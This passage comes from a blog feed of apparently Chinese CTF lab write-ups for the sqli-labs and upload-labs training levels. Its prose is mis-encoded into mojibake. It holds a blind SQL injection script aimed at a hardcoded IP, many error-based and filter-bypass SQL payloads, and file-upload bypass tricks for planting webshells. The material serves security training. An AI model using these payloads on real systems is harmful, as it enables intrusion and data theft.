class=\"hljs-string\">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&quot;</span><br>result = <span class=\"hljs-string\">&quot;&quot;</span><br> <br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get_length</span>(<span class=\"hljs-params\">value</span>):</span>  <span class=\"hljs-comment\">#è·å–è¦æŸ¥è¯¢çš„æ•°æ®çš„é•¿åº¦</span><br>    <span class=\"hljs-keyword\">for</span> n <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">100</span>):<br>        payload = <span class=\"hljs-string\">&quot;admin&#x27;) and length((&#123;0&#125;)) =&#123;1&#125; #&quot;</span>.<span class=\"hljs-built_in\">format</span>(data_payload,n)<br>        data = &#123;<span class=\"hljs-string\">&quot;uname&quot;</span>:payload,<span class=\"hljs-string\">&quot;passwd&quot;</span>:<span class=\"hljs-string\">&quot;admin&quot;</span>&#125;<br>        html = requests.post(url,data=data)<br>        length = <span class=\"hljs-built_in\">len</span>(html.text)<br>        <span class=\"hljs-keyword\">if</span> length &gt;value:<br>            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;â€¦â€¦data length is :&quot;</span> + <span class=\"hljs-built_in\">str</span>(n))<br>            <span class=\"hljs-keyword\">return</span>  n<br> <br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get_data</span>(<span class=\"hljs-params\">data_length,value</span>):</span> <span class=\"hljs-comment\">#è·å–æ•°æ®</span><br>    <span class=\"hljs-keyword\">global</span> result<br>    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,data_length):<br>        <span class=\"hljs-keyword\">for</span> char <span class=\"hljs-keyword\">in</span> chars:<br>            payload = <span class=\"hljs-string\">&quot;admin&#x27;)and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.<span class=\"hljs-built_in\">format</span>(data_payload,i,<span class=\"hljs-built_in\">ord</span>(char))<br>            data = &#123;<span class=\"hljs-string\">&quot;uname&quot;</span>:payload,<span class=\"hljs-string\">&quot;passwd&quot;</span>:<span class=\"hljs-string\">&quot;admin&quot;</span>&#125;<br>            html = requests.post(url,data=data)<br>            length = <span class=\"hljs-built_in\">len</span>(html.text)<br>            <span class=\"hljs-keyword\">if</span> length&gt;value:         <span class=\"hljs-comment\">#æ ¹æ®è¿”å›é•¿åº¦çš„ä¸åŒæ¥åˆ¤æ–­å­—ç¬¦æ­£ç¡®ä¸å¦</span><br>                result += char<br>                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;â€¦â€¦ data is :&quot;</span>+ result)<br>                <span class=\"hljs-keyword\">break</span><br> <br> <br>url = <span class=\"hljs-string\">&quot;http://47.96.233.216:8080/Less-13/&quot;</span><br>data_payload = <span class=\"hljs-string\">&quot;select group_concat(table_name)from information_schema.tables where table_schema = database()&quot;</span><br>value = <span class=\"hljs-number\">1460</span> <br> <br>length = get_length(value) +<span class=\"hljs-number\">1</span><br>get_data(length,value)<br><span class=\"hljs-built_in\">print</span>(result)<br><br></code></pre></td></tr></table></figure>\n<h2 id=\"Less-14\"><a href=\"#Less-14\" class=\"headerlink\" title=\"Less-14\"></a>Less-14</h2><p>ç”¨<code>&quot;</code>é—­åˆ</p>\n<h2 id=\"Less-15\"><a href=\"#Less-15\" class=\"headerlink\" title=\"Less-15\"></a>Less-15</h2><p>åŒç¬¬åä¸‰å…³è„šæœ¬</p>\n<h2 id=\"Less-16\"><a href=\"#Less-16\" class=\"headerlink\" title=\"Less-16\"></a>Less-16</h2><p>ç”¨<code>&quot;)</code>é—­åˆ</p>\n<h2 id=\"Less-17\"><a href=\"#Less-17\" class=\"headerlink\" title=\"Less-17\"></a>Less-17</h2><p>ç›²çŒœæŠ¥é”™æ³¨å…¥</p>\n<h3 id=\"æ•°æ®ç±»å‹æº¢å‡º\"><a href=\"#æ•°æ®ç±»å‹æº¢å‡º\" class=\"headerlink\" title=\"æ•°æ®ç±»å‹æº¢å‡º\"></a>æ•°æ®ç±»å‹æº¢å‡º</h3><p>select exp(~(select*from(select user())x));   # MySQL &lt; 5.5.53<br>pow, cot</p>\n<h3 id=\"å‡ ä½•å‡½æ•°æŠ¥é”™\"><a href=\"#å‡ ä½•å‡½æ•°æŠ¥é”™\" class=\"headerlink\" title=\"å‡ ä½•å‡½æ•°æŠ¥é”™\"></a>å‡ ä½•å‡½æ•°æŠ¥é”™</h3><p>select multipoint((select * from (select * from (select version())a)b)); # ä½ç‰ˆæœ¬<br>geometrycollection multipoint polygon multipolygon linestring multilinestringç­‰</p>\n<h3 id=\"Xpathè¯­æ³•é”™è¯¯\"><a href=\"#Xpathè¯­æ³•é”™è¯¯\" class=\"headerlink\" title=\"Xpathè¯­æ³•é”™è¯¯\"></a>Xpathè¯­æ³•é”™è¯¯</h3><p>select updatexml(1,concat(0x3a,(select @@version),0x3a),1) # MySQL &gt; 5.1<br>select extractvalue(1,concat(0x3a,(select @@version),0x3a))</p>\n<p>å¦å¤–å½“concatè¢«è¿‡æ»¤æ—¶å¯ä»¥<br>updatexml(1,make_set(3,â€™â€™,(select version())),1)</p>\n<h3 id=\"æŠ¥é”™æ³¨å…¥çš„å‡ ç§å‡½æ•°åŠå…¶ç”¨æ³•ï¼š\"><a href=\"#æŠ¥é”™æ³¨å…¥çš„å‡ ç§å‡½æ•°åŠå…¶ç”¨æ³•ï¼š\" class=\"headerlink\" title=\"æŠ¥é”™æ³¨å…¥çš„å‡ ç§å‡½æ•°åŠå…¶ç”¨æ³•ï¼š\"></a>æŠ¥é”™æ³¨å…¥çš„å‡ ç§å‡½æ•°åŠå…¶ç”¨æ³•ï¼š</h3><ol>\n<li>floor():<code>select count(*) from infromation_schema.tables group by concat((select database()),floor(rand(0)*2));</code>group by å¯¹rand()å‡½æ•°è¿›è¡Œæ“ä½œæ—¶äº§ç”Ÿé”™è¯¯</li>\n<li>extractvalue():<code>extractualue(1,concat(0x7e,(select database()),0x7e));</code>XPATHè¯­æ³•é”™è¯¯æŠ¥é”™</li>\n<li>updatexml():<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>XPATHè¯­æ³•é”™è¯¯æŠ¥é”™</li>\n<li>MYSQL5.7æ–°å¢ï¼š<code>select gtid_subset((select @@version), 2);</code><br>åœ¨passwdå¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼š<br>payloadï¼š<code>11111&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),321)--+</code><br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/9.png\" alt=\"sql\"><h2 id=\"Less-18\"><a href=\"#Less-18\" class=\"headerlink\" title=\"Less-18\"></a>Less-18</h2>å¯ä»¥çŒœæµ‹UAå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹<br>æ„é€ UA<code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code><h2 id=\"Less-19\"><a href=\"#Less-19\" class=\"headerlink\" title=\"Less-19\"></a>Less-19</h2>refferå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå…¶ä½™åŒä¸Š<h2 id=\"Less-20\"><a href=\"#Less-20\" class=\"headerlink\" title=\"Less-20\"></a>Less-20</h2>æ‰“å¼€æç¤ºcookieï¼Œé‚£å°±å…ˆæŠ“ä¸ªåŒ…ï¼Œæ„é€ cookie<code>uname=admin&#39;</code>å‘ç°æŠ¥é”™ï¼Œå¯çŸ¥å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå…¶ä½™å°±æ˜¯æ­£å¸¸æ­¥éª¤ï¼Œå…ˆåˆ¤æ–­åˆ—æ•°ï¼Œå¯ä»¥å‘ç°æ˜¯3ã€‚ã€‚ã€‚ã€‚<h2 id=\"Less-21\"><a href=\"#Less-21\" class=\"headerlink\" title=\"Less-21\"></a>Less-21</h2>ç”¨<code>&#39;)</code>é—­åˆï¼Œå¹¶ä¸”æ˜¯è¦ç»è¿‡base64ç¼–ç ï¼Œå…¶ä½™åŒä¸Š<h2 id=\"Less-22\"><a href=\"#Less-22\" class=\"headerlink\" title=\"Less-22\"></a>Less-22</h2>ç”¨<code>&quot;</code>é—­åˆ<h2 id=\"Less-23\"><a href=\"#Less-23\" class=\"headerlink\" title=\"Less-23\"></a>Less-23</h2><code>#</code>ä»¥åŠ<code>--</code>è¢«è¿‡æ»¤<br>é‚£å°±ç”¨<code>or &#39;1&#39;=&#39;1</code>æ¥é—­åˆå¤šä½™å‡ºæ¥çš„å•å¼•å·<h2 id=\"Less-24\"><a href=\"#Less-24\" class=\"headerlink\" title=\"Less-24\"></a>Less-24</h2>äºŒæ¬¡æ³¨å…¥<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/10.png\" alt=\"sql\"><br>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º<code>admin&#39; #</code>çš„è´¦å·ï¼Œè™½ç„¶æ³¨å†Œæ—¶ä¼šè¢«è½¬ä¹‰ï¼Œä½†æ˜¯æ•°æ®è¿˜æ˜¯ä¼šè¢«å­˜å…¥æ•°æ®åº“ï¼Œæ‰€ä»¥åœ¨æ¥ä¸‹æ¥å…¶ä»–åœ°æ–¹è¢«è°ƒç”¨æ—¶å°±ä¼šå‡ºç°æ¼æ´ï¼Œå³åœ¨æ”¹å¯†ç æ—¶ï¼ŒSQLè¯­å¥æ‹¼æ¥å‡º<code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39; #&#39; and password=&#39;$curr_pass&#39; &quot;</code>ï¼Œå°±å¯ä»¥ä¿®æ”¹adminçš„å¯†ç ï¼Œå®ç°SQLæ³¨å…¥<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/11.png\" alt=\"sql\"><br>å°±å¯ä»¥ç”¨adminè´¦æˆ·ç™»å½•<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/12.png\" alt=\"sql\"></li>\n</ol>\n<h2 id=\"Less-25\"><a href=\"#Less-25\" class=\"headerlink\" title=\"Less-25\"></a>Less-25</h2><p>ANDå’ŒORéƒ½è¢«è¿‡æ»¤ï¼Œä½†æ˜¯UNIONæ²¡æœ‰è¢«è¿‡æ»¤å¯ä»¥å®ç°æ³¨å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡åŒå†™æ¥Bypassè¿‡æ»¤ï¼š<code>id=-1&#39; oorr 1=1--+</code></p>\n<h2 id=\"Less-25a\"><a href=\"#Less-25a\" class=\"headerlink\" title=\"Less-25a\"></a>Less-25a</h2><p>å’Œ25ä¸€æ ·</p>\n<h2 id=\"Less-26\"><a href=\"#Less-26\" class=\"headerlink\" title=\"Less-26\"></a>Less-26</h2><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæœ¬æƒ³ç€ç”¨<code>/**/</code>ç»•è¿‡ï¼Œå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œä¸€çœ‹æºç ï¼š<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/13.png\" alt=\"sql\"><br>è¿‡æ»¤äº†å¤§éƒ¨åˆ†çš„ä¸œè¥¿ï¼Œæœ¬æ¥æƒ³ç€ç»•è¿‡ç©ºæ ¼çš„æ–¹å¼ï¼š<br>%09 TABé”®ï¼ˆæ°´å¹³ï¼‰ã€%0a æ–°å»ºä¸€è¡Œã€%0c æ–°çš„ä¸€é¡µã€%0d returnåŠŸèƒ½ã€%0b TABé”®ï¼ˆå‚ç›´ï¼‰ã€%a0 ç©ºæ ¼ï¼Œå‘ç°å…¶ä¸­%a0ä»¥åŠ%0bå¯ç”¨ï¼Œ<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/14.png\" alt=\"sql\"><br>æˆ–è€…éœ€è¦ç”¨()ç»•è¿‡ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼ï¼Œæ„é€ payloadï¼š<code>?id=-1%27||extractualue(1,concat(0x7e,(select%20database()),0x7e))||%271%27=%271</code><br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/15.png\" alt=\"sql\"><br><code>0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1</code>çˆ†è¡¨å<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/16.png\" alt=\"sql\"></p>\n<h2 id=\"Less-26a\"><a href=\"#Less-26a\" class=\"headerlink\" title=\"Less-26a\"></a>Less-26a</h2><p>åŸºäºç»•è¿‡è¿‡æ»¤ç©ºæ ¼åçš„æ­£ç¡®æ³¨å…¥ï¼ˆå¯ç”¨%a0ç»•è¿‡ï¼‰ï¼Œæˆ–è€…åŸºäºboolç›²æ³¨ï¼Œå› ä¸ºæ²¡æœ‰é”™è¯¯å›æ˜¾ï¼Œæ‰€ä»¥ä¸èƒ½æŠ¥é”™æ³¨å…¥</p>\n<h2 id=\"Less-27\"><a href=\"#Less-27\" class=\"headerlink\" title=\"Less-27\"></a>Less-27</h2><p>é¢˜ç›®è¯´è¿‡æ»¤äº†UNIONå’ŒSELECTï¼Œä½†æ˜¯æŸ¥çœ‹æºä»£ç å‘ç°å¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚ã€‚ã€‚åŒæ—¶è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šå¤«ï¼Œå¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•ç»•è¿‡ï¼Œpayloadâ€œ<code>?id=0&#39;%a0unIon%a0seleCt%a01,2,3||&#39;1&#39;=&#39;1</code></p>\n<h2 id=\"Less-27a\"><a href=\"#Less-27a\" class=\"headerlink\" title=\"Less-27a\"></a>Less-27a</h2><p>ç”¨<code>&quot;</code>é—­åˆï¼Œå…¶ä½™åŒä¸Š</p>\n<h2 id=\"Less-28\"><a href=\"#Less-28\" class=\"headerlink\" title=\"Less-28\"></a>Less-28</h2><p>è™½ç„¶é¢˜ç›®è¯´è¿‡æ»¤äº†unionå’Œselectï¼Œä½†æ˜¯å‘ç°ä»ç„¶æ˜¯å¯ä»¥ç”¨çš„ï¼Œä¸çŸ¥é“æ˜¯ç¯å¢ƒé—®é¢˜è¿˜æ˜¯é¢˜ç›®æœ¬æ¥å°±æ˜¯è¿™æ ·çš„ï¼ŒåŒæ—¶æ˜¯ç”¨<code>(&#39;</code>é—­åˆçš„ï¼Œä¸”è¿‡æ»¤äº†ç©ºæ ¼ç­‰ï¼Œè¯¾ç”¨ä¸Šé¢çš„æ–¹æ³•ç»•è¿‡<br>payloadï¼š<code>?id=0&#39;)%a0union%a0select%a01,2,3||(&#39;1&#39;=&#39;1</code><br>åæ¥æ‰å‘ç°é¢˜ç›®æ˜¯è¿‡æ»¤äº†<code>union select</code>è¿™ä¸ªè¯ç»„ï¼Œå› ä¸ºä¸­é—´åŠ äº†<code>%a0</code>,åˆšå¥½ç»•è¿‡äº†æ£€æµ‹</p>\n<h2 id=\"Less-28a\"><a href=\"#Less-28a\" class=\"headerlink\" title=\"Less-28a\"></a>Less-28a</h2><p>åŒä¸Šï¼Œä½†æ˜¯è²Œä¼¼å‡å°‘è¯¾è¿‡æ»¤çš„ä¸œè¥¿ï¼Œæ›´ç®€å•äº†ï¼Ÿï¼Ÿ</p>\n<h2 id=\"Less-29\"><a href=\"#Less-29\" class=\"headerlink\" title=\"Less-29\"></a>Less-29</h2><p>å°è¯•ä¸€ä¸‹<code>?id=0%27union%20select%201,2,3--+</code>,å‘ç°å¥½åƒå•¥ä¹Ÿæ²¡è¿‡æ»¤ï¼Ÿï¼Ÿï¼Ÿ<br>ç„¶åå°±å’Œç¬¬ä¸€å…³ä¸€æ ·äº†ã€‚ã€‚ã€‚</p>\n<h2 id=\"Less-30\"><a href=\"#Less-30\" class=\"headerlink\" title=\"Less-30\"></a>Less-30</h2><p>å…ˆç”¨å•å¼•å·é—­åˆå‘ç°æ²¡ç”¨ï¼Œå†ç”¨åŒå¼•å·é—­åˆå‘ç°æŠ¥é”™ï¼Œæ¥ä¸‹æ¥å°±å’Œä¸Šé¢çš„ä¸€æ ·äº†</p>\n<h2 id=\"Less-31\"><a href=\"#Less-31\" class=\"headerlink\" title=\"Less-31\"></a>Less-31</h2><p>ç”¨<code>&quot;)</code>é—­åˆï¼Œå…¶ä½™ä¸€æ ·</p>\n<h2 id=\"Less-32\"><a href=\"#Less-32\" class=\"headerlink\" title=\"Less-32\"></a>Less-32</h2><p>å®½å­—èŠ‚æ³¨å…¥ï¼Œpayloadï¼š<code>?id=0%df%27%20union%20select%201,2,3--+</code></p>\n<h2 id=\"Less-33\"><a href=\"#Less-33\" class=\"headerlink\" title=\"Less-33\"></a>Less-33</h2><p>åŒä¸Š</p>\n<h2 id=\"Less-34\"><a href=\"#Less-34\" class=\"headerlink\" title=\"Less-34\"></a>Less-34</h2><p>è¿™é‡Œçš„æäº¤æ–¹å¼æ˜¯postï¼Œä½†æ˜¯åˆç”¨/è½¬ä¹‰äº†â€™ï¼Œä¸€ç§æ–¹å¼æ˜¯å°†utf-8è½¬æ¢ä¸ºutf-16æˆ– utf-32ï¼Œä¾‹å¦‚å°† â€˜ è½¬ä¸ºutf-16ä¸ºï¿½â€™ ï¼Œä½†æ˜¯è¿™%dfä»ç„¶å¯ä»¥ç”¨<br>ï¼Œå†åŠ ä¸ŠæŠ¥é”™æ³¨å…¥ï¼š<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/17.png\" alt=\"sql\"></p>\n<h2 id=\"Less-35\"><a href=\"#Less-35\" class=\"headerlink\" title=\"Less-35\"></a>Less-35</h2><p>ç›´æ¥æ³¨ã€‚ã€‚ã€‚</p>\n<h2 id=\"Less-36\"><a href=\"#Less-36\" class=\"headerlink\" title=\"Less-36\"></a>Less-36</h2><p>%dfå®½å­—èŠ‚æ³¨å…¥</p>\n<h2 id=\"Less-37\"><a href=\"#Less-37\" class=\"headerlink\" title=\"Less-37\"></a>Less-37</h2><p>è¿™ä¸€æ¬¡å°±æ²¡æœ‰åƒ34å…³ä¸€æ ·ç®€å•ï¼Œ%dfæ²¡æœ‰åŠæ³•ç”¨äº†ï¼Œä½†æ˜¯å¯ä»¥å°†utf-8è½¬æ¢ä¸ºutf-16æˆ– utf-32ï¼Œæ„é€ payloadâ€œ<code>111ï¿½&#39; union select 1,(select database())--+</code></p>\n<p><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/18.png\" alt=\"sql\"></p>\n<h2 id=\"Less-38\"><a href=\"#Less-38\" class=\"headerlink\" title=\"Less-38\"></a>Less-38</h2><p>ç›´æ¥æ³¨ã€‚ã€‚ã€‚</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/10/12/upload-labs/",
            "url": "http://blog.m1n.me/2019/10/12/upload-labs/",
            "title": "upload-labs",
            "date_published": "2019-10-12T02:48:24.000Z",
            "content_html": "<p>emmmm</p>\n<span id=\"more\"></span>\n<h1 id=\"Less-1\"><a href=\"#Less-1\" class=\"headerlink\" title=\"Less-1\"></a>Less-1</h1><ol>\n<li>å‰ç«¯éªŒè¯ï¼Œå…ˆå°†ä¸€å¥è¯æ”¹æˆjpgï¼Œé€šè¿‡å‰ç«¯éªŒè¯åæŠ“åŒ…ä¿®æ”¹åç¼€åä¸ºphpä»¥åŠä¿®æ”¹content-typeï¼šapplication/octet-streamæˆåŠŸä¸Šä¼ </li>\n<li>ç¦ç”¨JSç›´æ¥ä¸Šä¼ </li>\n</ol>\n<h1 id=\"Less-2\"><a href=\"#Less-2\" class=\"headerlink\" title=\"Less-2\"></a>Less-2</h1><p>è¿™ä¸€å…³æ£€æµ‹çš„æ˜¯Content-Type: image/jpegï¼ŒæŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹å°±ok</p>\n<h1 id=\"Less-3\"><a href=\"#Less-3\" class=\"headerlink\" title=\"Less-3\"></a>Less-3</h1><p>é»‘åå•ç»•è¿‡ï¼Œå¯ä»¥ä¸Šä¼ .phtmlç­‰æ–‡ä»¶ç»•è¿‡ï¼Œphpè§£é‡Šå™¨å¯ä»¥å°†phptã€php3ã€4ã€5ã€phtmlè§£ææˆPHPæ–‡ä»¶ï¼Œä¸èƒ½è§£æçš„åç¼€ä¼šä»¥txtå½¢å¼å±•ç°ï¼Œä½†æ˜¯å…¶ä¸­åŒ…å«çš„htmlä»£ç ä¼šè¢«æµè§ˆå™¨è§£æï¼Œå¯ä»¥æ‰§è¡ŒJSä»£ç </p>\n<h1 id=\"Less-4\"><a href=\"#Less-4\" class=\"headerlink\" title=\"Less-4\"></a>Less-4</h1><p>å…ˆä¸Šä¼ ä¸€ä¸ªtest.phpxæ–‡ä»¶ï¼Œå†ä¸Šä¼ .htaccessæ–‡ä»¶ä½¿å¾—å®ƒèƒ½å¤Ÿè¢«è§£ææ¥ç»•è¿‡.htaccesså†…å®¹ï¼š</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-section\">&lt;FilesMatch <span class=\"hljs-string\">&quot;test.phpx&quot;</span>&gt;</span><br><br>  <span class=\"hljs-attribute\"><span class=\"hljs-nomarkup\">SetHandler</span></span> application/x-httpd-php<br><br><span class=\"hljs-section\">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>\n<p>æˆ–è€…ï¼š</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">AddType <span class=\"hljs-built_in\">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure>\n<p>æ¥ä½¿å¾—jpgèƒ½è¢«è§£æ</p>\n<h1 id=\"Less-5\"><a href=\"#Less-5\" class=\"headerlink\" title=\"Less-5\"></a>Less-5</h1><p>å¤§å°å†™ç»•è¿‡ã€‚ã€‚ã€‚ã€‚</p>\n<h1 id=\"Less-6\"><a href=\"#Less-6\" class=\"headerlink\" title=\"Less-6\"></a>Less-6</h1><p>æ–‡ä»¶åç»“å°¾åŠ ç©ºæ ¼ç»•è¿‡é»‘åå•</p>\n<h1 id=\"Less-7\"><a href=\"#Less-7\" class=\"headerlink\" title=\"Less-7\"></a>Less-7</h1><p>æ–‡ä»¶ç»“å°¾åŠ â€œ.â€å¯ä»¥è¢«è§£æ</p>\n<h1 id=\"Less-8\"><a href=\"#Less-8\" class=\"headerlink\" title=\"Less-8\"></a>Less-8</h1><p>æ–‡ä»¶ç»“å°¾åŠ â€œ::$DATAâ€,Windowsç‰¹æ€§</p>\n<h1 id=\"Less-9\"><a href=\"#Less-9\" class=\"headerlink\" title=\"Less-9\"></a>Less-9</h1><p>æ–‡ä»¶ç»“å°¾åŠ â€œ.ç©ºæ ¼.â€ï¼Œæœ€åä¼šå˜æˆâ€.php.â€Windowsç‰¹æ€§</p>\n<h1 id=\"Less-10\"><a href=\"#Less-10\" class=\"headerlink\" title=\"Less-10\"></a>Less-10</h1><p>ä¸Šä¼ phtmlhpç»•è¿‡</p>\n<h1 id=\"Less-11\"><a href=\"#Less-11\" class=\"headerlink\" title=\"Less-11\"></a>Less-11</h1><p>ä¸Šä¼ è·¯å¾„ä¿®æ”¹æˆ../upload/1.php%00,%00æˆªæ–­ã€‚æˆ–è€…å°è¯•1.php/. </p>\n<h1 id=\"Less-12\"><a href=\"#Less-12\" class=\"headerlink\" title=\"Less-12\"></a>Less-12</h1><p>ä¸Šä¼ è·¯å¾„ä¿®æ”¹æˆ../upload/1.php+ï¼Œç„¶åç”¨16è¿›åˆ¶æŸ¥çœ‹ï¼Œæ‰¾åˆ°68  70   2bï¼ŒæŠŠ2bä¿®æ”¹æˆ00ç„¶åä¸Šä¼ </p>\n<h1 id=\"Less-13\"><a href=\"#Less-13\" class=\"headerlink\" title=\"Less-13\"></a>Less-13</h1><p>è¦æ±‚ä¸Šä¼ ä¸‰ç§æ ¼å¼çš„å›¾ç‰‡é©¬ï¼Œç„¶åç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œã€‚jpgæ ¼å¼å¯ä»¥ç›´æ¥ç”¨CMDå‘½ä»¤<code>copy test.jpg/b test.php/a ma.jpg</code>ç”Ÿæˆï¼ŒGIFå’ŒPNGæ ¼å¼å¯ä»¥é€šè¿‡Hxdä¿®æ”¹æ­£å¸¸å›¾ç‰‡ç”Ÿæˆï¼Œ</p>\n<p>å…¶ä¸­JPGæ ¼å¼å¤´éƒ¨<code>FF D8 (FF E0)</code>å°¾éƒ¨<code>FF D9</code>PNGæ ¼å¼å¤´éƒ¨<code>89 50 4E 47 0D 0A 1A 0A</code>GIFæ ¼å¼å¤´éƒ¨<code>47 49 46 38 39 61</code></p>\n<h1 id=\"Less-14\"><a href=\"#Less-14\" class=\"headerlink\" title=\"Less-14\"></a>Less-14</h1><p>æç¤ºç”¨getimagesize()è·å–å›¾ç‰‡ä¿¡æ¯ï¼ŒåŒæ ·ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ç»•è¿‡</p>\n<h1 id=\"Less-15\"><a href=\"#Less-15\" class=\"headerlink\" title=\"Less-15\"></a>Less-15</h1><p>æç¤ºæœ¬passä½¿ç”¨exif_imagetype()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼ï¼Œç»•è¿‡æ–¹æ³•åŒä¸Š</p>\n<h1 id=\"Less-16\"><a href=\"#Less-16\" class=\"headerlink\" title=\"Less-16\"></a>Less-16</h1><p>æç¤ºè¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ï¼Œå°è±¡ä¸­æ˜¯æŸä¸€ä¸ªåŒºå—äºŒæ¬¡æ¸²æŸ“æ—¶ä¸ä¼šè¢«æ”¹å˜ï¼ŒGIFæ ¼å¼åŠ åœ¨å°¾éƒ¨çš„ä»£ç ä¼šè¢«åˆ é™¤ï¼Œæˆ‘æ‰¾åˆ°äº†ä¸­é—´ç©ºç™½éƒ¨åˆ†ï¼ŒåŠ ä¸Šphpinfoåå°±å¯ä»¥æ‰§è¡Œã€‚</p>\n<p>PNGè¿˜æœ‰JPGæ ¼å¼çš„å¤„ç†æ–¹æ³•æ¯”è¾ƒéº»çƒ¦ï¼Œç”¨ç½‘ä¸Šçš„è„šæœ¬æ¥ç”Ÿæˆ</p>\n<p>PNG:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$p</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-number\">0xa3</span>, <span class=\"hljs-number\">0x9f</span>, <span class=\"hljs-number\">0x67</span>, <span class=\"hljs-number\">0xf7</span>, <span class=\"hljs-number\">0x0e</span>, <span class=\"hljs-number\">0x93</span>, <span class=\"hljs-number\">0x1b</span>, <span class=\"hljs-number\">0x23</span>,<br>           <span class=\"hljs-number\">0xbe</span>, <span class=\"hljs-number\">0x2c</span>, <span class=\"hljs-number\">0x8a</span>, <span class=\"hljs-number\">0xd0</span>, <span class=\"hljs-number\">0x80</span>, <span class=\"hljs-number\">0xf9</span>, <span class=\"hljs-number\">0xe1</span>, <span class=\"hljs-number\">0xae</span>,<br>           <span class=\"hljs-number\">0x22</span>, <span class=\"hljs-number\">0xf6</span>, <span class=\"hljs-number\">0xd9</span>, <span class=\"hljs-number\">0x43</span>, <span class=\"hljs-number\">0x5d</span>, <span class=\"hljs-number\">0xfb</span>, <span class=\"hljs-number\">0xae</span>, <span class=\"hljs-number\">0xcc</span>,<br>           <span class=\"hljs-number\">0x5a</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0xdc</span>, <span class=\"hljs-number\">0x5a</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0xdc</span>, <span class=\"hljs-number\">0xa3</span>, <span class=\"hljs-number\">0x9f</span>,<br>           <span 